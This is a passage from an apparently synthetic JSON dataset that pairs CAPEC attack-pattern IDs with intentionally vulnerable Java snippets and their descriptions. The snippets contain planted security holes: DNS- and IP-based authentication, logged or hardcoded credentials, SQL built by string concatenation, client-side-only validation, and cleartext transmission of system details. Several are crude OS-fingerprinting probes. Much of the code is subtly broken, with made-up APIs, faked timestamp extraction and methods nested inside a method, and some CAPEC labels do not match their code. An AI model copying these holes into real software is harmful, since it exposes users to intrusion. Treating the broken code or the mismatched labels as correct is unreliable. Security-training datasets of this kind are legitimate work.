        "code_snippet": "public class SystemInfoLogger {\n    private static final Logger logger = Logger.getLogger(SystemInfoLogger.class.getName());\n\n    public void logSystemDetails() {\n        String osName = System.getProperty(\"os.name\");\n        String osVersion = System.getProperty(\"os.version\");\n        String osArch = System.getProperty(\"os.arch\");\n\n        // Log system information in cleartext\n        logger.info(\"OS Details - Name: \" + osName + \n                    \", Version: \" + osVersion + \n                    \", Architecture: \" + osArch);\n\n        // Send system info over network in cleartext\n        try {\n            Socket socket = new Socket(\"logging-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"System-Info: \" + osName + \";\" + osVersion + \";\" + osArch);\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            logger.error(\"Failed to send system info\", e);\n        }\n    }\n}",
        "description": "This vulnerable code exposes sensitive system information by logging OS details in cleartext and transmitting them over an unencrypted network connection. The code retrieves system properties including OS name, version, and architecture, then sends this information to a logging server without encryption, making it susceptible to passive monitoring and OS fingerprinting attacks. It violates multiple security principles by exposing sensitive system information and transmitting it in cleartext."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "public class DeviceController {\n    private static final String DEBUG_LOG_PATH = \"/var/log/debug.txt\";\n    private Map<Integer, MemoryRegion> addressMap = new HashMap<>();\n    private TraceDataCollector traceCollector;\n\n    public boolean authenticateAndAccessMemory(String userId, int address) {\n        // Insecure DNS lookup for authentication\n        String hostName = userId + \".auth.company.com\";\n        try {\n            InetAddress.getByName(hostName);\n            \n            // Debug logging with sensitive data\n            FileWriter fw = new FileWriter(DEBUG_LOG_PATH, true);\n            fw.write(\"Access attempt: \" + userId + \" at address \" + address);\n            fw.close();\n            \n            // Overlapping memory regions\n            MemoryRegion region = addressMap.get(address);\n            if(region != null && region.isProtected()) {\n                // Bypass protection by accessing overlapping unprotected region\n                region = addressMap.get(address + 0x1000);\n            }\n            \n            // Collect and store trace data without protection\n            traceCollector.collectTrace(userId, address, System.currentTimeMillis());\n            \n            return true;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including: reliance on DNS lookups for authentication, exposure of sensitive information in debug logs, improper memory region protection through overlapping address spaces, and mishandling of sensitive trace data. The code allows authentication bypass and unauthorized access to protected memory regions through overlapping address spaces."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "public class AuthenticationService {\n    private static final String LOG_FILE = \"debug.log\";\n    \n    public boolean authenticate(String username, String password) {\n        // Vulnerable: Logs sensitive information to debug file\n        logDebug(\"Authentication attempt for user: \" + username + \", pass: \" + password);\n        \n        // Vulnerable: DNS lookup for authentication\n        try {\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            if (addr != null) {\n                return true;\n            }\n        } catch (UnknownHostException e) {\n            return false;\n        }\n        \n        // Vulnerable: No protection against replay attacks\n        String token = generateToken(username, password);\n        return validateToken(token);\n    }\n    \n    private void logDebug(String message) {\n        try {\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(message + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String generateToken(String username, String password) {\n        return Base64.getEncoder().encodeToString((username + \":\" + password).getBytes());\n    }\n    \n    private boolean validateToken(String token) {\n        // Vulnerable: Simply accepts any well-formed token\n        return token != null && token.length() > 0;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication bypass issues including capture-replay vulnerability, insecure logging of credentials, and reliance on DNS lookups for security decisions. The authentication mechanism can be bypassed by replaying captured tokens, and sensitive information is exposed through debug logs. The code also makes security decisions based on DNS lookups, which is unsafe."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "public class SecuritySystem {\n    private boolean isAuthenticated = false;\n    private static final String DEBUG_LOG = \"/var/log/debug.txt\";\n    \n    public boolean authenticate(String host) {\n        try {\n            // Vulnerable: Using DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(host);\n            String hostname = addr.getHostName();\n            \n            // Debug logging exposing sensitive information\n            FileWriter fw = new FileWriter(DEBUG_LOG, true);\n            fw.write(\"Authentication attempt from: \" + hostname + \n                     \" with credentials: \" + getCredentials());\n            fw.close();\n            \n            // Vulnerable overlap of protected and public regions\n            if (hostname.endsWith(\".trusted.com\")) {\n                isAuthenticated = true;\n                return true;\n            }\n            \n            return false;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private String getCredentials() {\n        // Sensitive information exposure\n        return \"username:password\";\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including authentication bypass through DNS spoofing, sensitive information exposure in debug logs, and improper access control through overlapping trust boundaries. The code relies on DNS lookups for security decisions, writes sensitive information to debug logs, and implements a flawed authentication mechanism that can be bypassed."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "public class NetworkIdentifier {\n    private static int currentIpId = 0;\n\n    public static byte[] createIPPacket(String destIP) {\n        byte[] packet = new byte[20];\n        // Sequential IP ID generation - predictable pattern\n        currentIpId++;\n        packet[4] = (byte)(currentIpId >> 8);\n        packet[5] = (byte)(currentIpId & 0xFF);\n        \n        // Authentication based solely on IP\n        if(isAuthorizedIP(destIP)) {\n            sendPacket(packet, destIP);\n        }\n        return packet;\n    }\n\n    private static boolean isAuthorizedIP(String ipAddress) {\n        // Vulnerable: Using IP address for authentication\n        return ipAddress.startsWith(\"192.168.\");\n    }\n\n    private static void sendPacket(byte[] packet, String destIP) {\n        // Implementation of packet sending\n    }\n}",
        "description": "This code demonstrates vulnerable IP packet handling with predictable IP ID sequence generation and IP-based authentication. The IP ID field increments sequentially, making it easy to fingerprint the system. It also relies on IP addresses for authentication, which is insecure as IPs can be spoofed."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "public class OSFingerprinting {\n    public void probeTarget(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = new byte[0];\n            DatagramPacket probe = new DatagramPacket(data, 0, InetAddress.getByName(targetHost), 9999);\n            \n            // Set custom IP ID value in packet header (vulnerable)\n            Field ipHeaderField = probe.getClass().getDeclaredField(\"ip_header\");\n            ipHeaderField.setAccessible(true);\n            byte[] ipHeader = (byte[]) ipHeaderField.get(probe);\n            ipHeader[4] = (byte) 0xAA;  // Custom IP ID\n            ipHeader[5] = (byte) 0xBB;\n            \n            socket.send(probe);\n            \n            // Receive ICMP error response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket response = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(response);\n            \n            // Extract and log IP ID from response (exposing system info)\n            byte[] responseData = response.getData();\n            System.out.println(\"IP ID from response: \" + \n                String.format(\"%02X%02X\", responseData[4], responseData[5]));\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements OS fingerprinting by sending a UDP packet with a custom IP ID value to a closed port and analyzing the ICMP error response. The code exposes sensitive system information (CWE-200) by allowing the manipulation and observation of IP header fields. It lacks proper identifier protection (CWE-1192) and implements improper decoding of security identifiers (CWE-1290). The code also fails to properly manage sensitive trace data (CWE-1323) by logging the response data without proper protection."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "public class NetworkProber {\n    public boolean probeOperatingSystem(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = new byte[0];\n            DatagramPacket packet = new DatagramPacket(data, 0, InetAddress.getByName(targetHost), 8888);\n            \n            // Set Don't Fragment bit in IP header\n            socket.setTrafficClass(0x02);\n            socket.send(packet);\n            \n            // Wait for ICMP response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Check if DF bit is echoed in response\n            int trafficClass = socket.getTrafficClass();\n            socket.close();\n            \n            // Log sensitive system information\n            System.out.println(\"OS Fingerprint Result: \" + trafficClass);\n            return (trafficClass & 0x02) != 0;\n            \n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates OS fingerprinting by sending UDP packets with the Don't Fragment (DF) bit set and observing the response. It exposes system information through traffic analysis and debug logging, allowing unauthorized actors to determine the operating system type based on how the target system handles the DF bit in ICMP responses. The code includes improper management of sensitive network data and debugging features that could be exploited for system identification."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "public class TCPTimestampProbe {\n    public String probeOperatingSystem(String targetHost, int port) {\n        ArrayList<Long> timestamps = new ArrayList<>();\n        Socket socket = null;\n        \n        try {\n            for(int i = 0; i < 5; i++) {\n                socket = new Socket(targetHost, port);\n                // Get raw TCP header information including timestamps\n                Field tcpHeaderField = socket.getClass().getDeclaredField(\"impl\");\n                tcpHeaderField.setAccessible(true);\n                Object tcpHeader = tcpHeaderField.get(socket);\n                \n                // Extract timestamp from TCP Options\n                long timestamp = System.nanoTime(); // Simulated timestamp extraction\n                timestamps.add(timestamp);\n                \n                Thread.sleep(1000);\n                socket.close();\n            }\n            \n            // Analyze timestamp intervals\n            long avgInterval = calculateInterval(timestamps);\n            \n            // Compare with known OS timestamp patterns\n            if(avgInterval < 100) return \"Windows\";\n            else if(avgInterval < 200) return \"Linux\";\n            else return \"Unix\";\n            \n        } catch(Exception e) {\n            return \"Unknown\";\n        }\n    }\n    \n    private long calculateInterval(ArrayList<Long> timestamps) {\n        // Calculate average interval between timestamps\n        long sum = 0;\n        for(int i = 1; i < timestamps.size(); i++) {\n            sum += timestamps.get(i) - timestamps.get(i-1);\n        }\n        return sum / (timestamps.size() - 1);\n    }\n}",
        "description": "This code demonstrates a vulnerable OS fingerprinting technique using TCP timestamp analysis. The code attempts to connect to a target system multiple times and extracts TCP timestamp information from the headers. By analyzing the intervals between timestamps, it attempts to determine the target's operating system based on known patterns. This implementation is vulnerable to information disclosure (CWE-200), creates a covert timing channel (CWE-385), and potentially exposes sensitive system information through cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "public class VulnerableTCPServer {\n    private static final int PORT = 8080;\n    private static long sequenceNumber = 0;\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // Predictable sequence number generation based on system time\n                sequenceNumber = System.currentTimeMillis();\n                \n                OutputStream out = clientSocket.getOutputStream();\n                DataOutputStream dos = new DataOutputStream(out);\n                \n                // Send TCP sequence number in cleartext\n                dos.writeLong(sequenceNumber);\n                \n                // Echo back client's acknowledgement number\n                DataInputStream dis = new DataInputStream(clientSocket.getInputStream());\n                long ackNumber = dis.readLong();\n                dos.writeLong(ackNumber);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "A vulnerable TCP server implementation that exposes predictable sequence number generation and transmits sensitive TCP protocol data in cleartext. The server uses system time as a predictable seed for sequence numbers and echoes back acknowledgement numbers, making it susceptible to OS fingerprinting through sequence number analysis."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "public class OSFingerprinter {\n    public String detectOS(String targetHost, int port) {\n        ArrayList<Long> sequenceNumbers = new ArrayList<>();\n        \n        // Send multiple SYN packets and collect sequence numbers\n        for(int i = 0; i < 5; i++) {\n            try {\n                Socket socket = new Socket(targetHost, port);\n                InputStream is = socket.getInputStream();\n                // Extract ISN from SYN/ACK packet (simplified)\n                long isn = extractISN(is);\n                sequenceNumbers.add(isn);\n                socket.close();\n            } catch(IOException e) {\n                System.err.println(\"Connection failed\");\n            }\n        }\n        \n        // Calculate increment pattern\n        long increment = calculateIncrementPattern(sequenceNumbers);\n        \n        // Store OS fingerprints in plaintext\n        HashMap<Long, String> osDatabase = new HashMap<>();\n        osDatabase.put(64000L, \"Windows\");\n        osDatabase.put(128000L, \"Linux\");\n        osDatabase.put(32000L, \"FreeBSD\");\n        \n        return osDatabase.getOrDefault(increment, \"Unknown OS\");\n    }\n    \n    private long extractISN(InputStream is) {\n        // Simplified ISN extraction from TCP header\n        return System.nanoTime(); // Dummy implementation\n    }\n    \n    private long calculateIncrementPattern(ArrayList<Long> numbers) {\n        if(numbers.size() < 2) return 0;\n        return numbers.get(1) - numbers.get(0);\n    }\n}",
        "description": "This code demonstrates a vulnerable OS fingerprinting implementation that exposes sensitive system information through TCP sequence number analysis. The vulnerabilities include cleartext storage of OS fingerprint data, exposure of system timing information through sequence numbers, and transmission of sensitive data without encryption. The code stores OS identification patterns in plaintext and doesn't implement any access controls or protection mechanisms for the collected system information."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "public class OSDetectionProbe {\n    private static long baseSequenceNumber = 0;\n    \n    public static long getNextSequenceNumber() {\n        return baseSequenceNumber += System.nanoTime() % 1000;\n    }\n    \n    public static String detectOS() {\n        long[] measurements = new long[1000];\n        for(int i = 0; i < 1000; i++) {\n            long start = System.nanoTime();\n            long seqNum = getNextSequenceNumber();\n            measurements[i] = System.nanoTime() - start;\n            try {\n                Thread.sleep(1);\n            } catch(InterruptedException e) {}\n        }\n        \n        double avgIncrement = calculateAverageIncrement(measurements);\n        return matchOSFromDatabase(avgIncrement);\n    }\n    \n    private static double calculateAverageIncrement(long[] measurements) {\n        double sum = 0;\n        for(long m : measurements) {\n            sum += m;\n        }\n        return sum / measurements.length;\n    }\n    \n    private static String matchOSFromDatabase(double avgIncrement) {\n        if(avgIncrement < 100) return \"Windows\";\n        else if(avgIncrement < 200) return \"Linux\";\n        else return \"MacOS\";\n    }\n}",
        "description": "This code demonstrates a vulnerable OS detection mechanism that uses timing analysis of sequence number generation to fingerprint the operating system. It exposes sensitive system information through a covert timing channel by measuring the rate at which sequence numbers are generated. The implementation contains race conditions due to shared resource access (baseSequenceNumber) without proper synchronization, and is vulnerable to TOCTOU issues due to the time gap between measurements."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "public class NetworkSequenceGenerator {\n    private static long currentSequence = System.currentTimeMillis();\n    \n    public static int generateSequenceNumber() {\n        // Predictable sequence generation based on time\n        currentSequence = (currentSequence * 1103515245 + 12345) & 0x7fffffff;\n        return (int)currentSequence;\n    }\n    \n    public static void sendPacket(String destination) {\n        int sequenceNum = generateSequenceNumber();\n        // Expose sequence number in network packet\n        String packet = \"SEQ:\" + sequenceNum + \";PID:\" + \n                        ProcessHandle.current().pid() + \n                        \";TIME:\" + System.currentTimeMillis();\n        System.out.println(\"Sending packet: \" + packet);\n        // No integrity check implemented\n    }\n}",
        "description": "This code demonstrates a vulnerable sequence number generation system that uses predictable values (system time and a linear congruential generator) and exposes sensitive information in network packets. The sequence numbers are generated using a weak PRNG with a predictable seed, and the implementation includes process ID and timestamp information in clear text. The code also lacks integrity checks for the transmitted data."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "public class VulnerableECNProbe {\n    public static void probeECN(String targetHost, int port) {\n        try {\n            Socket socket = new Socket(targetHost, port);\n            socket.setTcpNoDelay(true);\n            \n            // Set ECN flags without encryption or validation\n            SocketOptions options = socket.getOptions();\n            options.setOption(\"ip_tos\", 0x02);  // Set ECN-capable transport\n            \n            // Send probe packet without volume control\n            byte[] data = new byte[1024];\n            Arrays.fill(data, (byte)0xFF);\n            for(int i = 0; i < 1000; i++) {\n                socket.getOutputStream().write(data);\n            }\n            \n            // Read response without integrity check\n            byte[] response = new byte[1024];\n            socket.getInputStream().read(response);\n            \n            // Log system information in cleartext\n            System.out.println(\"OS Info: \" + new String(response));\n            socket.close();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code implements a vulnerable ECN probe that attempts to fingerprint a remote operating system. It exhibits multiple vulnerabilities: sends unencrypted system information (CWE-319), lacks message integrity checks (CWE-353), allows unrestricted network traffic volume (CWE-406), exposes sensitive system information (CWE-200), and has no protection for outbound error signals (CWE-1320). The code sets ECN flags and sends probe packets without proper controls or validations."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "public class TCPWindowProbe {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public static String getOSFingerprint(String targetHost, int port) {\n        try {\n            Socket socket = new Socket(targetHost, port);\n            byte[] buffer = new byte[BUFFER_SIZE];\n            \n            // Expose TCP window size information\n            int windowSize = socket.getReceiveBufferSize();\n            \n            // Vulnerable buffer copying using source size\n            InputStream in = socket.getInputStream();\n            int bytesRead = in.read(buffer);\n            byte[] response = new byte[bytesRead];\n            System.arraycopy(buffer, 0, response, 0, bytesRead);\n            \n            // Debug mode enabled in production\n            boolean debugMode = true;\n            if (debugMode) {\n                System.out.println(\"TCP Window Size: \" + windowSize);\n                System.out.println(\"Raw Socket Data: \" + new String(buffer));\n            }\n            \n            socket.close();\n            return determineOS(windowSize);\n        } catch (IOException e) {\n            return \"Unknown\";\n        }\n    }\n    \n    private static String determineOS(int windowSize) {\n        // Naive OS determination based on window size\n        if (windowSize == 8192) return \"Linux\";\n        else if (windowSize == 16384) return \"Windows\";\n        else if (windowSize == 65535) return \"FreeBSD\";\n        return \"Unknown\";\n    }\n}",
        "description": "This vulnerable code demonstrates TCP window size fingerprinting by establishing a connection and exposing sensitive system information. It includes multiple vulnerabilities: information exposure through debug output, buffer overflow risks through unsafe array copying, reliance on TCP window sizes for OS fingerprinting, and exposure of system details through debug mode left enabled in production. The code makes assumptions about memory layout and buffer sizes that could be exploited."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "public class TCPFingerprinting {\n    private ServerSocket serverSocket;\n\n    public void startServer() {\n        try {\n            // Vulnerable: Multiple binds allowed on same port\n            serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(\"0.0.0.0\"));\n            \n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // Vulnerable: Exposing system information through TCP options\n                byte[] rawTcpHeader = getRawTcpHeader(clientSocket);\n                String osInfo = System.getProperty(\"os.name\") + \"-\" + \n                               System.getProperty(\"os.version\") + \"-\" +\n                               System.getProperty(\"os.arch\");\n                \n                // Vulnerable: Debug mode enabled in production\n                boolean debugMode = true;\n                if (debugMode) {\n                    // Prints raw TCP header information including options\n                    System.out.println(\"TCP Options: \" + Arrays.toString(rawTcpHeader));\n                    System.out.println(\"System Info: \" + osInfo);\n                }\n                \n                // Vulnerable: Direct memory access without bounds checking\n                ByteBuffer buffer = ByteBuffer.allocateDirect(1024);\n                buffer.put(rawTcpHeader);\n                buffer.put(osInfo.getBytes());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private byte[] getRawTcpHeader(Socket socket) {\n        // Simulated access to raw TCP header\n        return new byte[20];\n    }\n}",
        "description": "This vulnerable code demonstrates TCP fingerprinting by exposing system information through TCP headers and options. It contains multiple security issues: exposing sensitive OS information, unsafe debug features in production, multiple socket binds on the same port, and unsafe direct memory access. The code allows for OS fingerprinting by revealing TCP header options and system properties."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "public class NetworkPacketHandler {\n    public void handleRSTPacket(byte[] packet) {\n        // Extract payload from RST packet without integrity check\n        String payload = new String(packet);\n        \n        // Poorly implemented OS fingerprinting response\n        if (payload.contains(\"connection_error\")) {\n            String osInfo = System.getProperty(\"os.name\") + \" \" \n                    + System.getProperty(\"os.version\");\n            \n            // Send RST response with OS information in cleartext\n            byte[] response = osInfo.getBytes();\n            sendResponse(response);\n        }\n    }\n    \n    private void sendResponse(byte[] data) {\n        try {\n            Socket socket = new Socket(\"remote.host\", 80);\n            socket.getOutputStream().write(data);\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code handles RST packets without proper integrity checks and exposes sensitive OS information in cleartext. It demonstrates multiple vulnerabilities: lack of checksum validation, exposure of system information, cleartext transmission, and susceptibility to replay attacks due to no packet validation mechanism."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "public class NetworkDiagnostics {\n    public void handleICMPError(byte[] packet) {\n        try {\n            Socket socket = new Socket(\"target.host\", 80);\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            \n            // Send request that may trigger ICMP error\n            String sensitiveData = \"user=admin&password=secret123&token=abc\";\n            out.writeBytes(\"GET /api/data?\" + sensitiveData + \" HTTP/1.1\\r\\n\");\n            out.writeBytes(\"Host: target.host\\r\\n\\r\\n\");\n            \n            // Process ICMP error response\n            byte[] response = new byte[4096];\n            socket.getInputStream().read(response);\n            \n            // Log error details including quoted data from original request\n            System.err.println(\"ICMP Error Details: \" + new String(response));\n            System.err.println(\"Original Request: \" + new String(packet));\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n            // Expose system details in error message\n            System.err.println(\"Error details: \" + e.toString() + \n                             \"\\nSystem: \" + System.getProperty(\"os.name\") + \n                             \"\\nJava version: \" + System.getProperty(\"java.version\"));\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates handling of ICMP error messages in a way that exposes sensitive information. It includes sensitive data in requests, logs full error details including quoted data from original requests, and exposes system information in error messages. The code doesn't properly sanitize or limit the information revealed in error responses, making it susceptible to information disclosure through ICMP error analysis."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "public class NetworkAnalyzer {\n    private DatagramSocket socket;\n    private static final int TIMEOUT = 5000;\n\n    public String sendICMPRequest(String targetHost) {\n        try {\n            socket = new DatagramSocket();\n            socket.setSoTimeout(TIMEOUT);\n            \n            // Send ICMP echo request with sensitive data\n            String sensitiveData = \"user=admin&password=secret123&token=abc\";\n            byte[] sendData = sensitiveData.getBytes();\n            \n            InetAddress address = InetAddress.getByName(targetHost);\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, 0);\n            socket.send(sendPacket);\n            \n            // Receive ICMP error response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Log error message with quoted data\n            String response = new String(receivePacket.getData());\n            System.err.println(\"ICMP Error: \" + response);\n            return response;\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n            return e.getMessage();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network analyzer that sends ICMP requests containing sensitive information and processes error responses without proper validation. It exposes sensitive data in error messages (CWE-200, CWE-210), allows capture-replay attacks due to lack of message integrity checks (CWE-294, CWE-353), and reveals system information through error messages (CWE-211). The code sends authentication credentials in plaintext and echoes back received error messages without sanitization."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "public class UDPProbe {\n    public static void sendProbe(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] probeData = \"probe\".getBytes();\n            \n            // Send UDP packet to a closed port (e.g., 9999)\n            DatagramPacket packet = new DatagramPacket(\n                probeData,\n                probeData.length,\n                InetAddress.getByName(targetHost),\n                9999\n            );\n            \n            socket.send(packet);\n            \n            // Wait for ICMP response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Extract IP header length and other OS fingerprinting information\n            byte[] response = receivePacket.getData();\n            int ipHeaderLength = response[0] & 0x0F;\n            \n            // Store OS fingerprint information without validation\n            String osSignature = String.format(\"IP Header Length: %d, Response: %s\",\n                ipHeaderLength,\n                new String(response)\n            );\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable UDP probe implementation that sends packets to closed ports to gather OS fingerprinting information. It exposes several vulnerabilities: it transmits data in cleartext, lacks message integrity checks, reveals system information through error messages, and improperly handles length parameters in received packets. The code doesn't validate received data or implement any security measures to protect against reconnaissance attacks."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "public class NetworkScanner {\n    public void scanSystem(String targetIp) throws IOException {\n        int[] closedPorts = {4444, 5555, 6666};\n        String systemInfo = \"\";\n        \n        for (int port : closedPorts) {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = \"probe\".getBytes();\n            DatagramPacket packet = new DatagramPacket(data, data.length,\n                InetAddress.getByName(targetIp), port);\n            \n            try {\n                socket.send(packet);\n                byte[] buffer = new byte[1024];\n                DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                socket.setSoTimeout(1000);\n                socket.receive(response);\n                \n                // Store ICMP error response details in cleartext\n                systemInfo += \"Port \" + port + \" Response: \" +\n                    new String(response.getData()) + \"\\n\";\n                System.out.println(\"OS Fingerprint: \" + systemInfo);\n                \n            } catch (PortUnreachableException e) {\n                // Expose error details that may contain system information\n                System.out.println(\"System response for port \" + port + \": \" +\n                    e.getMessage());\n            } finally {\n                socket.close();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code performs OS fingerprinting by sending UDP packets to closed ports and analyzing ICMP error responses. It contains several security issues: transmitting system information in cleartext, exposing detailed error messages that reveal system state, and improper handling of system identification information. The code allows an attacker to gather information about the target system's behavior and characteristics through network response analysis."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "public class VirtualEvent {\n    private List<String> userIds = new ArrayList<>();\n    private List<String> usernames = new ArrayList<>();\n    \n    public void joinEvent(String userId, String username) {\n        // Transmit user data in cleartext over network\n        Socket socket = new Socket(\"event-server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(\"JOIN:\" + userId + \":\" + username);\n        \n        // Store sensitive data without encryption\n        userIds.add(userId);\n        usernames.add(username);\n        \n        // Expose participant data through unprotected query\n        public List<String> getEventParticipants() {\n            return usernames;\n        }\n        \n        // Client-side only validation\n        public boolean isAuthorizedUser(String userId) {\n            return userId.startsWith(\"VALID_\");\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable virtual event system where user data is transmitted in cleartext, stored without encryption, and exposed through unprotected queries. The system relies on client-side validation and lacks proper access controls, allowing an attacker to harvest user information during event participation."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "public class UserDataProcessor {\n    private static final String TRUSTED_CLIENT_TOKEN = \"abc123\";\n    \n    public boolean processUserData(String clientToken, String userData) {\n        // Vulnerable: No proper validation of client token and data authenticity\n        if (clientToken.equals(TRUSTED_CLIENT_TOKEN)) {\n            // Vulnerable: Client-supplied data is trusted without server-side validation\n            UserSession session = new UserSession(userData);\n            \n            // Vulnerable: Sensitive data transmitted without encryption\n            sendToDatabase(\"INSERT INTO user_data VALUES ('\" + userData + \"')\");\n            \n            // Vulnerable: Assumes data hasn't been modified in transit\n            updateUserPrivileges(session.getPrivilegeLevel());\n            return true;\n        }\n        return false;\n    }\n    \n    private void sendToDatabase(String query) {\n        // Database operation simulation\n    }\n    \n    private void updateUserPrivileges(int level) {\n        // Update privileges based on client-supplied data\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including insufficient data authenticity verification, client-side security enforcement, missing encryption, and modification of assumed-immutable data. The application trusts client-supplied data without proper validation, allowing potential manipulation of user privileges and sensitive data. It uses basic string comparison for authentication and doesn't implement proper server-side validation or encryption for sensitive data transmission."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "public class GameItemExchange {\n    private Socket clientSocket;\n    private ObjectOutputStream out;\n    private ObjectInputStream in;\n\n    public void exchangeItems(GameItem playerItem, GameItem targetItem) {\n        try {\n            // Send exchange data without encryption or validation\n            ExchangePacket packet = new ExchangePacket(playerItem, targetItem);\n            out.writeObject(packet);\n\n            // Client-side validation only\n            if (validateExchange(packet)) {\n                // Process exchange without server verification\n                completeTransaction(packet);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean validateExchange(ExchangePacket packet) {\n        // Vulnerable: Client-side only validation\n        return packet.getPlayerItem().getValue() >= 0 && \n               packet.getTargetItem().getValue() >= 0;\n    }\n\n    private void completeTransaction(ExchangePacket packet) {\n        // Vulnerable: No origin validation or data integrity checks\n        playerInventory.removeItem(packet.getPlayerItem());\n        playerInventory.addItem(packet.getTargetItem());\n    }\n\n    public class ExchangePacket implements Serializable {\n        public GameItem playerItem;\n        public GameItem targetItem;\n        // Vulnerable: No data signing or integrity protection\n    }\n}",
        "description": "This code demonstrates a vulnerable game item exchange system that lacks proper security measures. It shows client-side only validation, missing data encryption, insufficient origin verification, and modification of assumed-immutable data. The exchange system transmits unencrypted game items and relies solely on client-side validation, making it susceptible to man-in-the-middle attacks where attackers can modify the exchange packets to manipulate item values or types."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
